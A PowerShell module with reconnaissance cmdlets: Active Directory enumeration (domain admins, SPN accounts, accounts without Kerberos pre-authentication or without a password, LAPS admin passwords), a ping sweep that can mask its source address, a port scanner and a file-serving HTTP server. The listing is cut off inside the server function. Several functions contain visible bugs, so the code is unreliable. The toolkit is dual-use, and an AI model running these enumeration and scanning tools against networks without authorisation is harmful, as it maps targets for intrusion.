<#
.SYNOPSIS
    Encode or Decode Base64 strings.


.SYNTAX
    Convert-Base64 [-Value] <string[]> {-Decode | -Encode}


.PARAMETERS
    -Value <String[]>
        Specifies a string to be encoded or decoded with base64.

        Enter a string consisting of spaces and special charcters if desired.DESCRIPTION

        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       True
        Accept wildcard characters?  false

    -Encode <Switch>
     This switch is used to tell the cmdlet to encode the base64 string

    -Decode <Switch>
    This switch parameter is used to tell the cmdlet to decode the base64 string


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
    C:\PS> Convert-Base64 -Value 'Hello World!'' -Encode
    # This example encodes "Hello World into Base64 format.

    C:\PS> Convert-Base64 -Value 'SGVsbG8gV29ybGQh' -Decode
    # This example decodes Base64 to a string.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.INPUTS
    -Value accepts strings from pipeline.
    System.String


.OUTPUTS
    System.String

#>
Function Convert-Base64
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                HelpMessage="Enter a string you wish to encode or decode using Base64. Example: Hello World!")] # End Parameter
            [string]$Value,

            [Parameter(Mandatory=$False)]
            [switch][bool]$Encode,

            [Parameter(Mandatory=$False)]
            [switch][bool]$Decode) # End param

    If (!($Encode.IsPresent -or $Decode.IsPresent))
    {

        Throw "Switch parameter -Decode or -Encode needs to be defined. "

    } # End If

    ElseIf ($Encode.IsPresent)
    {

        $StringValue  = [System.Text.Encoding]::UTF8.GetBytes("$Value")

        Try
        {

            [System.Convert]::ToBase64String($StringValue)

        } # End Try
        Catch
        {

            Throw "String could not be converted to Base64. The value entered is below. `n$Value"

        } # End Catch

    } # End If
    If ($Decode.IsPresent)
    {

        $EncodedValue = [System.Convert]::FromBase64String("$Value")

        Try
        {

            [System.Text.Encoding]::UTF8.GetString($EncodedValue)

        } # End Try
        Catch
        {

            throw "Base64 entered was not in a correct format. The value received is below. `n$Value"

        } # End Catch

    } # End ElseIf

} # End Function Convert-Base64


<#
.NAME
    Get-LdapInfo


.SYNOPSIS
    Perform LDAP Queries of the current domain. This requires a user account in order to execute the cmdlet.
    Due to the amount of switches I have not provieded examples for each one. The names are pretty self explanatory.


.NOTES
    Author: Rob Osborne
    ALias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthsoborne.com


.SYNTAX
    Get-LdapInfo [-Detailed] [ -DomainAdmins | -DomainControllers | -UAC ] [-LDAPS]


.PARAMETER
    -LDAPS                  [<SwitchParameter>]
        This switch parameter will perform searches using LDAP over SSL

    -Detailed                  [<SwitchParameter>]
        This switch parameter will display all properties of the rerturned objects


    -DomainControllers         [<SwitchParameter>]
         This switch is used to tell the cmdlet to get a list of the Domain's Controllers


    -AllServers                [<SwitchParameter>]
        This switch is used to obtain a list of all servers in the domain environment


    -AllMemberServers                [<SwitchParameter>]
        This switch is used to obtain a list of all member servers in the environment


    -DomainTrusts                [<SwitchParameter>]
        This switch is used to obtain a list of all trusted and federated domains for the domain


    -DomainAdmins              [<SwitchParameter>]
        The switch parameter is used to tell the cmdlet to obtain a list of members of the Domain Admins Group


    -UACTrusted                [<SwitchParameter>]
        This switch parameter is used to tell the cmdlet to get a list of UAC Permissions that can be delegated


    -NotUACTrusted                [<SwitchParameter>]
        This switch parameter is used to tell the cmdlet to get a list of UAC Permissions that can NOT be delegated


    -SPNNamedObjects                [<SwitchParameter>]
        This switch is used to obtain a list of Service Principal Named objects


    -EnabledUsers              [<SwitchParameter>]
        This switch parameter is used to tell the cmdlet to get a list of enabled user accounts in the domain


    -PossibleExecutives                [<SwitchParameter>]
        This switch is used to obtain a list of possible executives for the company


    -LogonScript               [<SwitchParameter>]
         This switch is used to tell the cmdlet to get a list of users who have logon scriprts assigned

    -ListAllOu               [<SwitchParameter>]
        This siwtch is meant to return a list of all OUs in the domain


    -ListComputer               [<SwitchParameter>]
        This switch is meant to return a list of all computers in the domain


    -ListContacts               [<SwitchParameter>]
        This switch is meant to return a list of contacts in the domain


    -ListUsers               [<SwitchParameter>]
        This switch is meant to return a list of all users in the domain


    -ListGroups               [<SwitchParameter>]
        This switch is meant to return a list of all groups in the domain


    -ListContainers      [<SwitchParameter>]
        This switch is used to return a list of all containers in the domain


    -ListDomainObjects     [<SwitchParameter>]
        This switch is used to return a list of all objects in the domain


    -ListBuiltInContainers        [<SwitchParameter>]
        This switch is used to return a list of built in OU containers in the domain


    -ChangePasswordAtNextLogon    [<SwitchParameter>]
        This switch is used to return a list of users who are set to change their password at next logon


    -PasswordNeverExpires       [<SwitchParameter>]
        This switch is used to obtain a list of users who have passwords that never expire


    -NoPasswordRequired        [<SwitchParameter>]
        This switch parameter is used to get a list of users who do not require a password to sign in


    -NoKerberosPreAuthRequired [<SwitchParameter>]
        This switch parameter is used to get a list of users who do not require preauthentication when being authenticated with Kerberos


    -PasswordsThatHaveNotChangedInYears       [<SwitchParameter>]
        This switch is used to obtain a list of user passwords that have not changed in years


.INPUTS
    SwitchParameters


.OUTPUTS

    IsPublic IsSerial Name                                     BaseType
    -------- -------- ----                                     --------
    True     True     Object[]                                 System.Array


.EXAMPLE

    -------------------------- EXAMPLE 1 --------------------------

    C:\PS> Get-LdapInfo -DomainControllers | Select-Object -Property 'Name','ms-Mcs-AdmPwd'

    # This example gets a list of all the Domain Controllers and displays the local admin password. (Requires Administrator Execution to get password attribute )
    If executed as an administrator you will also receive the local admin password under the ms-Mcs-AdmPwd attribute value.

    -------------------------- EXAMPLE 2 --------------------------

    C:\PS> Get-LdapInfo -AllServers

    # This example lists All Servers in the Domain

    -------------------------- EXAMPLE 3 --------------------------

    C:\PS> Get-LdapInfo -AllMemberServers

    # This example lists all Member Servers in the domain

    -------------------------- EXAMPLE 4 --------------------------

    C:\PS> Get-LdapInfo -DomainTrusts

    # This example lists Federated Trust Domains

    -------------------------- EXAMPLE 5 --------------------------

    C:\PS> Get-LdapInfo -DomainAdmins

    This example lists all Domain Admins in the domain

    -------------------------- EXAMPLE 6 --------------------------

    C:\PS> Get-LdapInfo -UACTrusted

    This example lists users who are trusted with UAC

    -------------------------- EXAMPLE 7 --------------------------

    C:\PS> Get-LdapInfo -NotUACTrusted

    This example lists users who are not trusted for UAC

    -------------------------- EXAMPLE 8 --------------------------

    C:\PS> Get-LdapInfo -SPNNamedObjects

    # This example lists SPN users

    -------------------------- EXAMPLE 9 --------------------------

    C:\PS> Get-LdapInfo -EnabledUsers

    # This example lists all Enabled Users

    -------------------------- EXAMPLE 10 --------------------------

    C:\PS> Get-LdapInfo -PossibleExecutives

    # This example finds users with Direct Reports and no manager possibly indicating an executive

    -------------------------- EXAMPLE 11 --------------------------

    C:\PS> Get-LdapInfo -LogonScript

    # This example lists all users who have logon scripts that execute

    -------------------------- EXAMPLE 12 --------------------------

    C:\PS> Get-LdapInfo -ListAllOU

    This example lists all of the Domains OUs in Acitve Directory

    -------------------------- EXAMPLE 13 --------------------------

    C:\PS> Get-LdapInfo -ListComputers

    This example lists all Active Directory Computers

    -------------------------- EXAMPLE 14 --------------------------

    C:\PS> Get-LdapInfo -ListContacts

    This example lists all Active Directory Contacts

    -------------------------- EXAMPLE 15 --------------------------

    C:\PS> Get-LdapInfo -ListGroups

    # This example lists all Active Directory Groups

    -------------------------- EXAMPLE 16 --------------------------

    C:\PS> Get-LdapInfo -ListGroups

    # This example lists all Active Directory Groups

    -------------------------- EXAMPLE 17 --------------------------

    C:\PS> Get-LdapInfo -ListContainers

    # This example lists Active Directory Containers

    -------------------------- EXAMPLE 18 --------------------------

    C:\PS> Get-LdapInfo -ListDomainObjects

    # This example lists Active Directory Domain Objects

    -------------------------- EXAMPLE 19 --------------------------

    C:\PS> Get-LdapInfo -ListBuiltInObjects

    # This example list Builtin In Active Directory Objects

    -------------------------- EXAMPLE 20 --------------------------

    C:\PS> Get-LdapInfo -ListBuiltInContainers

    This example lists Built In Active Directory Containers

    -------------------------- EXAMPLE 21 --------------------------

    C:\PS> Get-LdapInfo -ChangePasswordAtNextLogon

    This example lists users who are set to change their password at next logon.DESCRIPTION
    If a user does not have a "Logon Name" Configured in AD they will be returned with this results as well.

    -------------------------- EXAMPLE 22 --------------------------

    C:\PS> Get-LdapInfo -PasswordNeverExpires

    This example list users who have passwords that never expire

    -------------------------- EXAMPLE 23 --------------------------

    C:\PS> Get-LdapInfo -NoPasswordRequired

    # This example lists users who do not require a password for sign in

    -------------------------- EXAMPLE 24 --------------------------

    C:\PS> Get-LdapInfo -NoKerberosPreAuthRequired

    # This example lists users where Kerberos Pre Authentication is not enabled

    -------------------------- EXAMPLE 25 --------------------------

    C:\PS> Get-LdapInfo -PasswordsThatHaveNotChangedInYears | Where-Object -Property Path -notlike "*OU=Disabled*"

    # This example lists users who have passwords that have not changed in years who are also not in a Disabled group

    -------------------------- EXAMPLE 26 --------------------------

    C:\PS> Get-LdapInfo -DistributionGroups

    # This example lists all the Distribution Groups in Active Directory

    -------------------------- EXAMPLE 27 --------------------------

    C:\PS> Get-LdapInfo -SecurityGroups

    This example lists all the Security Groups in Active Directory

    -------------------------- EXAMPLE 28 --------------------------

    C:\PS> Get-LdapInfo -BuiltInGroups

    This example lists all Built In Groups in Active Directory

    -------------------------- EXAMPLE 29 --------------------------

    C:\PS> Get-LdapInfo -AllGlobalGroups

    This example lists all Global Groups in Active Directory

    -------------------------- EXAMPLE 30 --------------------------

    C:\PS> Get-LdapInfo -DomainLocalGroups

    # This example list Domain Local Groups from Active Directory

    -------------------------- EXAMPLE 31 --------------------------

    C:\PS> Get-LdapInfo -UniversalGroups

    # This example lists the Universal Groups from Active Directory

    -------------------------- EXAMPLE 32 --------------------------

    C:\PS> Get-LdapInfo -GlobalSecurityGroups

    # This example list Global Security Groups from Active Directory

    -------------------------- EXAMPLE 33 --------------------------

    C:\PS> Get-LdapInfo -UniversalSecurityGroups

    # This example lists Universal Security Gruops from Active Directory

    -------------------------- EXAMPLE 34 --------------------------

    C:\PS> Get-LdapInfo -DomainLocalSecurityGroups

    # This example lists Domain Local Security Groups from Active Directory

    -------------------------- EXAMPLE 35 --------------------------

    C:\PS> Get-LdapInfo -GlobalDistributionGroups

    This example lists Global Distribution Groups from Acitve Directory

#>
Function Get-LdapInfo {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False)]
            [switch][bool]$Detailed,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$LDAPS,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DomainControllers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$AllServers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$AllMemberServers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DomainTrusts,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DomainAdmins,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$UACTrusted,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$NotUACTrusted,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$SPNNamedObjects,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$EnabledUsers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$PossibleExecutives,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$LogonScript,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListAllOU,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListComputers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListContacts,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListUsers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListContainers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListDomainObjects,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ListBuiltInContainers,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$ChangePasswordAtNextLogon,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$PasswordNeverExpires,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$NoPasswordRequired,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$NoKerberosPreAuthRequired,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$PasswordsThatHaveNotChangedInYears,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DistributionGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$SecurityGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$BuiltInGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$AllGLobalGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DomainLocalGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$UniversalGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$GlobalSecurityGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$UniversalSecurityGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$DomainLocalSecurityGroups,

            [Parameter(
                Mandatory=$False)]
            [switch][bool]$GlobalDistributionGroups

        ) # End param

    BEGIN
    {

        Write-Verbose "Creating LDAP query..."

            If ($DomainControllers.IsPresent) {$LdapFilter = "(primaryGroupID=516)"}
            ElseIf ($AllServers.IsPresent) {$LdapFilter = '(&(objectCategory=computer)(operatingSystem=*server*))'}
            ElseIf ($AllMemberServers.IsPresent) {$LdapFilter = '(&(objectCategory=computer)(operatingSystem=*server*)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))'}
            ElseIf ($DomainTrusts.IsPresent) {$LdapFilter = '(objectClass=trustedDomain)'}

            ElseIf ($DomainAdmins.IsPresent) {$LdapFilter =  "(&(objectCategory=person)(objectClass=user)((memberOf=CN=Domain Admins,OU=Admin Accounts,DC=usav,DC=org)))"}
            ElseIf ($UACTrusted.IsPresent) {$LdapFilter =  "(userAccountControl:1.2.840.113556.1.4.803:=524288)"}
            ElseIf ($NotUACTrusted.IsPresent) {$LdapFilter = '(userAccountControl:1.2.840.113556.1.4.803:=1048576)'}
            ElseIf ($SPNNamedObjects.IsPresent) {$LdapFilter = '(servicePrincipalName=*)'}
            ElseIf ($EnabledUsers.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'}
            ElseIf ($PossibleExecutives.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user)(directReports=*)(!(manager=*)))'}
            ElseIf ($LogonScript.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user)(scriptPath=*))'}

            ElseIf ($ListAllOU.IsPresent) {$LdapFilter = '(objectCategory=organizationalUnit)'}
            ElseIf ($ListComputers.IsPresent) {$LdapFilter = '(objectCategory=computer)'}
            ElseIf ($ListContacts.IsPresent) {$LdapFilter = '(objectClass=contact)'}
            ElseIf ($ListUsers.IsPresent) {$LdapFilter = 'samAccountType=805306368'}
            ElseIf ($ListGroups.IsPresent) {$LdapFilter = '(objectCategory=group)'}
            ElseIf ($ListContainers.IsPresent) {$LdapFilter = '(objectCategory=container)'}
            ElseIf ($ListDomainObjects.IsPresent) {$LdapFilter = '(objectCategory=domain)'}
            ElseIf ($ListBuiltInContainers.IsPresent) {$LdapFilter = '(objectCategory=builtinDomain)'}

            ElseIf ($ChangePasswordAtNextLogon.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user)(pwdLastSet=0))'}
            ElseIf ($PasswordNeverExpires.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user) (userAccountControl:1.2.840.113556.1.4.803:=65536))'}
            ElseIf ($NoPasswordRequired.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user) (userAccountControl:1.2.840.113556.1.4.803:=32))'}
            ElseIf ($NoKerberosPreAuthRequired.IsPresent) {'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'}
            ElseIf ($PasswordsThatHaveNotChangedInYears.IsPresent) {$LdapFilter = '(&(objectCategory=person)(objectClass=user) (pwdLastSet>=129473172000000000))'}

            ElseIf ($DistributionGroups.IsPresent) {$LdapFilter = '(&(objectCategory=group)(!(groupType:1.2.840.113556.1.4.803:=2147483648)))'}
            ElseIf ($SecurityGroups.IsPresent) {$LdapFilter = '(groupType:1.2.840.113556.1.4.803:=2147483648)'}
            ElseIf ($BuiltInGroups.IsPresent) {$LdapFilter = '(groupType:1.2.840.113556.1.4.803:=1)'}
            ElseIf ($AllGlobalGroups.IsPresent) {$LdapFilter = '(groupType:1.2.840.113556.1.4.803:=2)'}
            ElseIf ($DomainLocalGroups.IsPresent) {$LdapFilter = '(groupType:1.2.840.113556.1.4.803:=4)'}
            ElseIf ($UniversalGroups.IsPresent) {$LdapFilter = '(groupType:1.2.840.113556.1.4.803:=8)'}
            ElseIf ($GlobalSecurityGroups.IsPresent) {$LdapFilter = '(groupType=-2147483646)'}
            ElseIf ($UniversalSecurityGroups.IsPresent) {$LdapFilter = '(groupType=-2147483640)'}
            ElseIf ($DomainLocalSecurityGroups.IsPresent) {$LdapFilter = '(groupType=-2147483644)'}
            ElseIf ($GlobalDistributionGroups.IsPresent) {$LdapFilter = '(groupType=2)'}

            $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry
            $Searcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $ObjDomain = New-Object -TypeName System.DirectoryServices.DirectoryEntry

            If ($LDAPS.IsPresent)
            {

                Write-Verbose "[*] LDAP over SSL was specified. Using port 636"
                $SearchString =  "LDAP://" + $PrimaryDC + ":636/"

            }  # End If
            Else
            {

                $SearchString =  "LDAP://" + $PrimaryDC + ":389/"

            }  # End Else
            $PrimaryDC = ($DomainObj.PdcRoleOwner).Name

            $DistinguishedName = "DC=$($DomainObj.Name.Replace('.',',DC='))"
            $SearchString += $DistinguishedName

            $Searcher.SearchRoot = $ObjDomain
            $Searcher.Filter = $LdapFilter
            $Searcher.SearchScope = "Subtree"

        } # End BEGIN

    PROCESS
    {

        $Results = $Searcher.FindAll()

        Write-Verbose "[*] Getting results..."


        If ($Detailed.IsPresent)
        {

            If ($Results.Properties)
            {

                ForEach ($Result in $Results)
                {

                    [array]$ObjProperties = @()

                    ForEach ($Property in $Result.Properties)
                    {

                        $ObjProperties += $Property

                    }  # End ForEach

                    $ObjProperties

                    Write-Output "-----------------------------------------------------------------------`n"

                } # End ForEach

            }  # End If
            Else
            {

                ForEach ($Result in $Results)
                {

                    $Object = $Result.GetDirectoryEntry()
                    $Object

                }  # End ForEach


            }  # End Else

        }  # End If
        Else
        {
            ForEach ($Result in $Results)
            {

                $Object = $Result.GetDirectoryEntry()
                $Object

            }  # End ForEach

        }  # End Else

    } # End PROCESS
    END
    {

        Write-Verbose "[*] LDAP Query complete. "

    } # End END

} # End Get-LdapInfo

<#
.SYNOPSIS
    Perform a pingsweep of a defiend subnet.


.SYNTAX
    Invoke-PingSweep -Subnet <string IP Address> -Start <Int> -End <Int> [-Count] <Int> [-Source { Singular | Multiple }]


.DESCRIPTION
    This cmdlet is used to perform a ping sweep of a defined subnet. Executioner is able to define the start and end IP range to use.DESCRIPTION
    Executioner is also able to define a source to mask where the ping sweep is coming from.


.EXAMPLES
    -------------------------- EXAMPLE 1 --------------------------
   C:\PS> Invoke-PingSweep -Subnet 192.168.1.0 -Start 1 -End 254 -Count 2 -Source Multiple
   This command starts a ping sweep from 192.168.1.1 through 192.168.1.254. It sends two pings to each address. It sends each ping from a random source address.


   -------------------------- EXAMPLE 2 --------------------------
  C:\PS> Invoke-PingSweep -Subnet 192.168.1.0 -Start 192 -End 224 -Source Singular
  This command starts a ping sweep from 192.168.1.192 through 192.168.1.224. It sends one ping to each address. It sends each ping from one source address that is different from the local IP addresses.


  -------------------------- EXAMPLE 3 --------------------------
 C:\PS> Invoke-PingSweep -Subnet 192.168.1.0 -Start 64 -End 192
 This command starts a ping sweep from 192.168.1.64 through 192.168.1.192. It sends one ping to each address. It sends each ping from the local computers IPv4 address.


.PARAMTERS
    -Subnet <string>
        Defines the Class C subnet range to perform the ping sweep

        Enter a string consisting of 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by a zero

        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false


    -Start <Int>
        Defines the start IPv4 address the ping sweep should begin the sweep from.

        Accepts a number between 1 and 254

        Required?                    True
        Position?                    1
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false


    -End <Int>
        Defines the end IPv4 address the ping sweep should end at.

        Accepts a number between 1 and 254

        Required?                    True
        Position?                    2
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false


    -Count <Int>
        Defines how many ICMP ping requests should be sent to each host's IPv4 address

        Accepts a number between 1 and 10

        Required?                    false
        Position?                    none
        Default value                1
        Accept pipeline input?       false
        Accept wildcard characters?  false


    -Source <bool>
        Defines whether you want to mask the IP address you are pinging from.

        Accepts a value of Singular or Multiple

        Required?                    false
        Position?                    none
        Default value                none
        Accept pipeline input?       false
        Accept wildcard characters?  false


.INPUTS
    None. This command does not accept value from pipeline


.OUTPUTS
    System.Array

    The results of this command is an array of active IP Addresses.
    NOTE: Technically this does not output an object yet. This is something I will do in the future


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com

#>
Function Invoke-PingSweep
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                HelpMessage="Enter an IPv4 subnet ending in 0. Example: 10.0.9.0")]
            [ValidatePattern("\d{1,3}\.\d{1,3}\.\d{1,3}\.0")]
            [string]$Subnet,

            [Parameter(
                Mandatory=$True,
                Position=1,
                HelpMessage="Enter the start IP of the range you want to scan.")]
            [ValidateRange(1,255)]
            [int]$Start = 1,

            [Parameter(
                Mandatory=$True,
                Position=2,
                HelpMessage="Enter the end IP of the range you want to scan.")]
            [ValidateRange(1,255)]
            [int]$End = 254,

            [Parameter(
                Mandatory=$False,
                Position=3)]
            [ValidateRange(1,10)]
            [int]$Count = 1,

            [Parameter(
                Mandatory=$False,
                Position=4)]
            [ValidateSet("Singular","Multiple")]
            [string]$Source
        ) # End param

        [array]$LocalIPAddress = Get-NetIPAddress -AddressFamily "IPv4" | Where-Object { ($_.InterfaceAlias -notmatch "Bluetooth|Loopback") -and ($_.IPAddress -notlike "169.254.*") }  | Select-Object -Property "IPAddress"
        [string]$ClassC = $Subnet.Split(".")[0..2] -Join "."
        [array]$Results = @()
        [int]$Timeout = 500

        Write-Host "The below IP Addressess are currently active." -ForegroundColor "Green"

        For ($i = 0; $i -le $End; $i++)
        {

            [String]$IP = "$ClassC.$i"

            # When Windows PowerShell is executing the command and source value is not defined
            If (($PsVersionTable.PSEdition -ne 'Core') -and ($Source -like $Null) -and ($IP -notlike $LocalIPAddress))
            {

                $Filter = 'Address="{0}" and Timeout={1}' -f $IP, $Timeout

                If ((Get-WmiObject "Win32_PingStatus" -Filter $Filter).StatusCode -eq 0)
                {

                    Write-Output $IP

                } # End If

            } # End If
            # When Core or Windows PowerShell is running or source is defined
            ElseIf (($PsVersionTable.PSEdition -eq 'Core') -or ($Source -ne $Null) -and ($IP -notlike $LocalIPAddress))
            {

                If ($Source -like 'Singular')
                {

                    $SourceIP = "$ClassC." + ($End - 1)

                    Write-Verbose "Sending Ping from $SourceIP to $IP"

                    Try
                    {

                        Test-Connection -BufferSize 16 -ComputerName $IP -Count $Count -Source $SourceIP -Quiet

                    }  # End Try
                    Catch
                    {

                        Write-Output "[x] Source routing may not be allowed on your device. Use ipconfig /all and check that Ip Routing Enabled is set to a value of YES. Otherwise this option will not work."

                    }  # End Catch
                } # End If
                ElseIf ($Source -like 'Multiple')
                {

                    For ($x = ($Start - 1); $x -le ($End - $Start); $x++)
                    {

                        $SourceIP = "$ClassC.$x"

                        # Uncomment the below line if you wish to see the source ip the ping is being sent from
                        # Write-Host "Sending ping from $SourceIP to $IP"

                        Try
                        {

                            Test-Connection -BufferSize 16 -ComputerName $IP -Count $Count -Source $SourceIP -Quiet

                        }  # End Try
                        Catch
                        {

                            Write-Output "[x] Source routing may not be allowed on your device. Use ipconfig /all and check that Ip Routing Enabled is set to a value of YES. Otherwise this option will not work."

                        }  # End Catch

                    } # End For

                } # End ElseIf

            }  # End ElseIf
            # When Core is running and source is not defined
            ElseIf (($PsVersionTable.PSEdition -eq 'Core') -and ($Source -eq $Null) -and ($IP -notlike $LocalIPAddress))
            {

                If (Test-Connection -BufferSize 16 -ComputerName $IP -Count $Count -Quiet)
                {

                    Write-Output $IP

                }  # End If

            }  # End ElseIf

        } # End For

} # End Function Invoke-PingSweep



<#
.NAME
    Invoke-PortScan


.SYNOPSIS
    Invoke-PortScan is a port scanner that is used for scanning ports 1 through 65535 on a single host.DESCRIPTION


.DESCRIPTION
    Scan all possible ports on a target host you define.DESCRIPTION


.PARAMETER
    -IpAddress <string>

        This parameter defines the target you wish to perform the port scan on.

        Required?                    true
        Position?                    0
        Default value                none
        Accept pipeline input?       false
        Accept wildcard characters?  false


.SYNTAX
    Invoke-PortScan -IpAddress <string>


.EXAMPLE
    Invoke-PortScan -IpAddress 192.168.0.1
        This example performs a port scan on 192.168.0.1 fomr ports 1-65535


.INPUTS
    System.String


.OUTPUTS
    None. This only displays the results as text and does not return an object.


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com


.LINK
    https://github.com/tobor88
    https://gitlab.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com
    https://osbornepro.com

#>
Function Invoke-PortScan
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage="Enter an ipv4 address of the target machine you wish to perform a port scan on")]
            [IpAddress]$IpAddress
            )  # End param

    $ErrorActionPreference= 'SilentlyContinue'
    [array]$Range = 1..65535

    ForEach ($Port in $Range)
    {

        If (Test-Connection -BufferSize 16 -Count 1 -Quiet -ComputerName $IpAddress)
        {

             $Socket = New-Object System.Net.Sockets.TcpClient($IpAddress, $Port)

             If ($Socket.Connected)
             {

                “[*] $Port is open”

                $Socket.Close()

             }  # End If

         }  # End If
         Else
         {

            Write-Output "[!] Host is not pingable"

         }  # End Else

    }  # End ForEach

}  # End Function Invoke-PortScan


<#
.NAME
    Start-SimpleHTTPServer


.SYNOPSIS
    Use this cmdlet to host files for download. The idea of this is to have a PowerShell tSimpleHTTPServer
    that is similar to Python's module SimpleHTTPServer


.DESCRIPTION
    Running this function will open a PowerShell web server on the device it is run on.DESCRIPTION
    The server can be accessed at http://localhost:8000 You can download files but directories are
    not able to be traversed through the web server.

.PARAMETER
    -Port
        The port parameter is for easily defining what port the http server should listen on.
        The default value is 8000.


.EXAMPLE
    Start-SimpleHTTPServer
        This example starts an HTTP server on port 8000


.NOTES
        Author: Rob Osborne
        Alias: tobor
        Contact: rosborne@osbornepro.com


.LINK
    https://github.com/tobor88
    https://gitlab.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com
    https://osbornepro.com

#>
Function Start-SimpleHTTPServer {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port for the HTTP Server to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [Int32]$Port
        )  # End param

    If ($Port -eq $Null)
    {

        $Port = 8000
        $Address = "http://localhost:$Port/"

    }  # End If
    Else
    {

        $Address = "http://localhost:$Port/"

    }  # End Else

    $WebServer = [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
    $WebServer

    $Listener = New-Object -TypeName System.Net.HttpListener
    $Listener.Prefixes.Add("$Address")
    $Listener.Start()

    New-PSDrive -Name 'SimpleHTTPServer' -Root $Pwd.Path -PSProvider FileSystem -Scope Global

    $Root = $Pwd.Path

    Set-Location -Path 'SimpleHTTPServer:\'

    Do {

        $Context = $Listener.GetContext()
        $RequestUrl = $Context.Request.Url
        $Response = $Context.Response
        $Context.User.Identity.Impersonate()

        Write-Host $RequestUrl
        [array]$Content = @()

        $LocalPath = $RequestUrl.LocalPath
        Try
        {

            $RequestedItem = Get-Item -Path "SimpleHTTPServer:\$LocalPath" -Force -ErrorAction Stop

            $FullPath = $RequestedItem.FullName

            If($RequestedItem.Attributes -Match "Directory")
            {
                Function Get-DirectoryContent {
                    [CmdletBinding(SupportsShouldProcess = $True)]
                        param (
                            [Parameter(
                                Mandatory = $True,
                                HelpMessage = 'Directory Path')]
                            [string]$Path,

                            [Parameter(
                                Mandatory = $False,
                                HelpMessage = 'Header Name')]
                            [string]$HeaderName,

                            [Parameter(
                                Mandatory = $False,
                                HelpMessage = 'Request URL')]
                            [string]$RequestURL,

                            [Parameter(
                                Mandatory = $False,
                                HelpMessage = 'Subfolder Name')]
                            [string]$SubfolderName,

                            [string]$Root
                        )  # End param
@"
                <html>
                <head>
                <title>$($HeaderName)</title>
                </head>
                <body>
                <h1>$($HeaderName) - $($SubfolderName)</h1>
                <hr>
                "@
                @"
                <a href="./../">[To Parent Directory]</a><br><br>
                <table cellpadding="5">
"@
                $Files = (Get-ChildItem -Path "$Path")
                Foreach ($File in $Files)
                {
                    $FileURL = ($File.FullName -Replace [regex]::Escape($Root), "" ) -Replace "\\","/"
                    If (!$File.Length)
                    {
                        $FileLength = "[dir]"
                    }  # End If
                    Else
                    {
                        $FileLength = $File.Length
                    }  # End Else
@"
                <tr>
